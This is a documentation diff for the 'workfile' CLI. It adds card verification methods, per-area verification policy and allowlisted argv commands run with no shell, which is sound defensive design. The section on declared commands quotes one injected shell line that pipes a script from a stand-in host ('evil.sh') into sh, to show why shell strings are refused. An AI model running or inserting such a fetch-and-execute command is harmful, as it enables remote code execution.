@@ -86,7 +86,7 @@ rather than arriving undocumented.
 ```bash
 workfile init [--root PATH] [--yes] [--dry-run] [--name NAME]
 workfile version                # the installed package version, one line
-workfile schema [--json]        # effective runtime schema (areas, vocabularies…)
+workfile schema [--json]        # effective runtime schema (areas, vocabularies, verification policy…)
 workfile doctor [--json] [--severity error|warning] [--max-issues N] [--rebuild-cache] [--fix]
 workfile doctor --new              # only what appeared since the baseline
 workfile doctor --accept-baseline  # record the current state as known
@@ -205,6 +205,9 @@ workfile card patch ID --axis NAME=VALUE          # repeatable; empty value clea
 workfile card claim ID [--scope PATH,PATH] [--actor ACTOR] [--force --reason TEXT]
 workfile card release ID [--actor ACTOR] [--status next] [--force --reason TEXT]
 workfile card transition ID STATUS [--actor ACTOR] [--force --reason TEXT]
+workfile card transition ID done [--method local|ci|manual] [--run URL] [--evidence TEXT]
+workfile card release ID --status done [--method ci --run URL]
+workfile card patch ID --json-input FILE [--method manual --evidence TEXT]
 workfile card archive ID [--actor ACTOR]
 workfile card reopen ID [--status backlog] [--actor ACTOR]
 workfile card reap [--dry-run] [--older-than HOURS] [--json]
@@ -213,6 +216,7 @@ workfile card renumber --duplicates [--actor ACTOR]
 workfile card ac ID                              # list criteria with their numbers
 workfile card ac ID --check 1,3 --check 5        # repeatable, comma lists accepted
 workfile card ac ID --uncheck 2
+workfile card verify ID [--only gate] [--actor ACTOR]   # run the declared commands
 ```
 
 Acceptance criteria are the `- [ ]` items under a `## Acceptance criteria` heading.
@@ -234,6 +238,68 @@ The reason is required only when `--force` actually waives something — the gat
 what it let through, so a `--force` that nothing refused records nothing and asks for
 nothing. Taking another actor's claim is the other waivable gate, and it is written the
 same way.
+
+Reaching `done` also writes a `verified` block into the card's frontmatter — when,
+how, at which commit, and a digest of the criteria it was proved against. `--method`
+says which tier it was:
+
+| Method | Means | Needs |
+| --- | --- | --- |
+| `local` | A command ran on your machine. Self-reported, and what you get when you pass no method. | — |
+| `ci` | A run anyone can open. | `--run URL` |
+| `manual` | A person judged something no command expresses. | `--evidence TEXT` and an actor |
+
+There is no `--method forced`. `forced` is what the record says when `--force` walked
+the gate past something, derived rather than asked for, and asking for it is refused —
+what was waived and why is already on the trail line above, and writing it twice would
+give the record two places to disagree. The three flags are refused, not dropped, on a
+write that does not close the card: `card transition ID review --method ci` is an
+instruction with nowhere to go, and exiting 0 on it is the one failure an agent cannot
+notice. `--evidence` is collapsed onto one line and written under the card's `## Notes`.
+
+`doctor` reports, without failing, a card verified against criteria text that has since
+changed, and a card whose commit is no longer an ancestor of HEAD. Neither is enforced
+retroactively: they are information about work that is already closed.
+
+### Which methods an area accepts
+
+Which of the three a close may use is the project's to declare, per area, under
+`cards.verification.methods`:
+
+```js
+cards: {
+    areas: ["api", "web", "docs"],
+    verification: {
+        methods: { api: ["ci"], docs: ["ci", "manual"], "*": ["ci", "local"] }
+    }
+}
+```
+
+`*` answers for every area not named, including the ones somebody adds next month —
+without it a new area escapes the policy in silence. Declare nothing and every method
+is accepted, which is what your project does today.
+
+Closing a card by a method its area does not accept is refused with
+`CARD_VERIFICATION_METHOD_REFUSED`, and the message names what the area does accept.
+**Passing no method does not exempt you**: a close with no `--method` records `local`,
+so under `{ api: ["ci"] }` a bare `card transition ID done` on an `api` card is refused
+too — a gate you get past by typing less is not a gate. `workfile schema --json` reports
+the policy under `cards.verification`, so an agent can read it instead of discovering it
+by being refused.
+
+It is the third gate a close meets, and it is waived the same way as the other two:
+`--force` with `--reason TEXT` gets through, the trail line names the area's
+verification policy among what it waived, and the card then records `forced` rather
+than the method that was refused. That is also why a forced close must not carry
+`--method`: the record has one answer for how the card was proved, and on a forced
+close that answer is `forced`.
+
+`doctor` reports two more findings, neither of them failing. A `done` card whose
+recorded method the policy no longer accepts is `verification-method-unaccepted` —
+tightening a policy must not invalidate work that already shipped. A policy naming an
+area `cards.areas` does not declare is `verification-policy-area-unknown`, reported
+rather than refused at config load: removing an area should not stop the workspace from
+loading, and a config that will not load takes the doctor that would explain it with it.
 
 `card create --json-input FILE` is the form to reach for when the card has a
 body. It takes the whole record — title, body, parent, source, tags, scope — in
@@ -270,6 +336,168 @@ nothing, and an open card with no value at all is a **warning**. Cards that are
 `done`, `discarded` or archived are exempt from the warning — declaring an axis
 on an existing repository must not emit one line per finished card, which is a
 flood nobody acts on rather than a signal.
+
+### Card-declared commands
+
+A card may bind an acceptance criterion to a command that proves it, in a
+`verify` block written through `card patch --json-input`:
+
+```yaml
+verify:
+    - id: gate
+      run: [pnpm, test, test/acceptance.test.ts]
+      criteria: [sha256:ab12…]
+```
+
+`run` is an **argument vector, not a shell line**, and it is spawned with no
+shell. That is what makes the allowlist below decidable: over a shell string
+`pnpm test` is a prefix of `pnpm test; curl evil.sh | sh` too, and a matcher
+would be predicting what a shell it never runs will do with the rest of the
+line. As an argv there is nothing to predict — `;` and `|` are bytes inside one
+argument, and matching is element-wise string equality. A `run` written as a
+single string is refused with `CARD_VERIFY_RUN_INVALID` rather than split on
+spaces, because splitting would be that same parser wearing a smaller hat.
+
+`cards.verification.commands` declares which commands a card may name, as argv
+prefixes:
+
+```js
+cards: {
+    areas: ["api", "infra"],
+    verification: {
+        commands: [["pnpm", "test"], ["pnpm", "lint"]]
+    }
+}
+```
+
+`["pnpm", "test"]` admits `pnpm test` and `pnpm test --filter cards`, and admits
+nothing that differs at any position the prefix names. The matcher normalises nothing —
+no case folding, no trimming, no path resolution, no Unicode normalisation — so
+`PNPM`, `./node_modules/.bin/pnpm` and a homoglyph are each simply not the
+declared command. A declared entry that could never match one is refused when
+the config loads: an empty array, because it is a prefix of everything;
+an empty or control-character-carrying element, because the frontmatter round
+trip would not return it unchanged.
+
+**The list is empty by default, so a project that declares nothing can run
+nothing.** A card naming an undeclared command is refused with
+`CARD_VERIFY_COMMAND_NOT_ALLOWED`, and the message names
+`cards.verification.commands` when the project has declared none.
+
+`doctor` runs the same check on read and reports `verify-command-not-allowed`
+as an **error**. That is the half that matters in a repository taking pull
+requests: a card is a Markdown file, so one can arrive as a file in a diff
+without ever calling a mutation, and the write-time refusal never runs. `doctor
+--json` is what the generated CI workflow exists to run, so the error is what
+turns the pull request red.
+
+Be clear about what the allowlist buys. It bounds which command a card may
+name; it cannot bound what that command does, because every command worth
+allowing dispatches through a file the same pull request can edit — `pnpm test`
+reads `package.json`, `make check` reads the Makefile. It is anti-escalation on
+a branch you trust, and it makes a declared command reviewable in one place.
+Containment for a branch you do not trust is a different control entirely, and
+belongs to the job rather than to the card: no secrets, no write token, and no
+evidence written back from a head you did not review.
+
+A card that already carries a command the project refuses is refused every
+write until the block goes, so it cannot be quietly closed around. Clear it and
+then move the card:
+
+```sh
+printf '{"verify": null}' | workfile card patch T-0042 --json-input -
+workfile card transition T-0042 discarded
+```
+
+### Running them
+
+```bash
+workfile card verify ID [--only ENTRY,ENTRY] [--actor ACTOR] [--json]
+```
+
+Runs each declared entry and reports pass or fail per entry, then checks the
+criteria the passing entries prove. It is the only thing that can: a bound
+criterion is one `card ac --check` refuses, so without this command a card that
+binds its criteria is a card nothing can close.
+
+Each `run` is spawned as an argument vector with **no shell**, from the
+workspace root, with stdin closed — a command that stops to ask a question would
+otherwise wait for a terminal nobody is watching. Entries run one at a time:
+two declared commands are usually two suites over one working tree, and
+deciding a project's build is safe to run twice at once is not this tool's call
+to make on its behalf. `--only` runs a subset, `--json` prints the whole report,
+and the command exits `1` unless every entry that ran passed.
+
+**What a run writes, and what it does not.** A criterion's box records what a
+command decided, so only a command that decided something writes one:
+
+| Outcome | Means | The bound criteria |
+| --- | --- | --- |
+| `passed` | Exit `0`. | Checked. |
+| `failed` | Any other exit status. | Unchecked — a proof that no longer reproduces is not a proof. |
+| `timed-out` | Killed at `cards.verification.timeoutSeconds`. | Untouched. |
+| `errored` | Never started: no such command, not executable. | Untouched. |
+
+The last two are deliberate and are not a smaller version of `failed`. Killing a
+command at the timeout is us giving up and a machine with no such command has
+decided even less; neither is a fact about the criterion. Unchecking there would
+let a run on the wrong machine erase a proof a right one produced, and the
+criterion is machine-owned, so `card ac --check` could not put it back. Both
+still exit `1`, and both print why.
+
+An entry that changes a criterion's state leaves a line on the card's trail
+naming it, because a box that moved because a subprocess exited otherwise has no
+author in the record at all:
+
+```text
+- 2026-08-06 09:12Z alice@studio · verify gate: pnpm test acceptance passed, checked #1, #3
+- 2026-08-06 11:40Z alice@studio · verify gate: pnpm test acceptance failed (exit 1), unchecked #1, #3
+```
+
+A run that changed nothing writes no line, the same rule a repeated
+`card transition` follows. `--actor` names who ran it, defaulting the way every
+other card command's does.
+
+**There is no `--dry-run`, and it is refused rather than ignored.** The flag
+previews filesystem changes, and a run that spawns every declared command and
+then skips the write-back has already done the part worth previewing.
+`workfile card show ID --json` reports the `verify` block, which is what looking
+first means here.
+
+The commands run **outside** the card's write lock — they take minutes, and a
+lock held across them would block every note, claim and status move for as long
+as a suite runs. The card is read again after the last command exits and the
+bindings are resolved against *that* reading, so a criterion reworded while the
+tests were running is no longer bound to the entry and the write is refused by
+name rather than applied to whatever line moved into that position.
+
+How long a command gets is the project's to declare:
+
+```js
+cards: {
+    verification: {
+        commands: [["pnpm", "test"]],
+        timeoutSeconds: 600
+    }
+}
+```
+
+Ten minutes by default, between 1 second and 12 hours, and there is no way to
+say "no timeout": a command that never exits would otherwise hold an unattended
+CI job forever. `workfile schema --json` reports the effective value under
+`cards.verification`.
+
+**On Windows, a `.cmd` shim cannot be started without a shell.** `pnpm`, `npm`
+and everything in `node_modules/.bin` are `.cmd` files there, and Node refuses
+to spawn one unless a shell parses the line — which is the thing the argv model
+exists to avoid. Such an entry reports `errored` and changes nothing, on that
+platform only. Declare something Windows can start directly, such as
+`["node", "node_modules/vitest/vitest.mjs", "run"]`.
+
+This is a CLI command and has no MCP tool or HTTP route. Executing a card's
+commands is something a person asks for at a terminal, and a tool that let an
+agent trigger it over a long-lived server connection is a wider decision than
+the one this implements.
 
 Claims carry an actor and optional path scope; the server refuses overlapping
 scopes and releases the claim when a card leaves `doing`.
